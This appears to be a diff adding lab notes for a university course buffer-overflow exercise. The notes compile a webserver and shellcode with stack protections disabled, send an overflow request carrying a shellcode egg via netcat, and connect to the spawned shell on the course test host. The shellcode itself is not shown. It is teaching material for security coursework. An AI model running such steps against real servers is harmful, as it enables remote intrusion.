@@ -1,0 +1,23 @@
+compile webserver
+gcc -m32 -z execstack -fno-stack-protector webserver.c -o webserver
+
+run webserver
+./webserver 8000
+./webserver 9180
+
+compile shellcode
+gcc -m32 -z execstack -fno-stack-protector shellcode.c -o shell
+
+run shellcode
+./shell 210
+
+normal request
+echo -e "GET / HTTP" | nc localhose 8000
+echo -e "GET / HTTP" | nc 310test.cs.duke.edu 9180
+
+hack
+echo -e "GET /${EGG} HTTP" | nc localhost 8000
+echo -e "GET /${EGG} HTTP" | nc 310test.cs.duke.edu 9180
+
+when hacked
+nc 310test.cs.duke.edu 19180
